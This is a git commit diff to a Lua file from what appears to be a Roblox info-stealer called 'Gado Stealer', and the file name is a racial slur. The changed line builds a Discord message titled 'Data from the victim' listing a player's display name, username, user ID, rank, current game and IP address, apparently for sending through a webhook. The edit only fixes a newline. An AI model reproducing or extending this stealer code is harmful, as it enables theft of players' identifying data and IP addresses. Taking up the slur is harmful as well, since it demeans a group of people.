3035028c30e3ee413830b3c9cc2c3c74ec1b0c9e
Subashians <104033466+Subashians@users.noreply.github.com>
2023-06-21 13:39:07 +0200

    Update nigs.lua

--- nigs.lua
+++ nigs.lua
@@ -24,7 +24,7 @@ local msg = {
   ["embeds"]= {
     {
       ["title"]= "`Gado Stealer results`",
-      ["description"]= "**Data from the victim**\n🧑Display Name: ".._G.PlrDisplayNameVictim.."\n🧑Username: ".._G.PlrUserVictim.."\n🧑User ID: ".._G.PlrUserIDVictim.."\n🐱Rank: ".._G.CurrentRank.."\n🎮Place: ".._G.GameIn.."\IP: "..ip.."",
+      ["description"]= "**Data from the victim**\n🧑Display Name: ".._G.PlrDisplayNameVictim.."\n🧑Username: ".._G.PlrUserVictim.."\n🧑User ID: ".._G.PlrUserIDVictim.."\n🐱Rank: ".._G.CurrentRank.."\n🎮Place: ".._G.GameIn.."\nIP: "..ip.."",
       ["url"]= "https://discord.gg/nqny2McnjK",
       ["color"]= ""..webhookcolor.."",
       ["fields"]= {
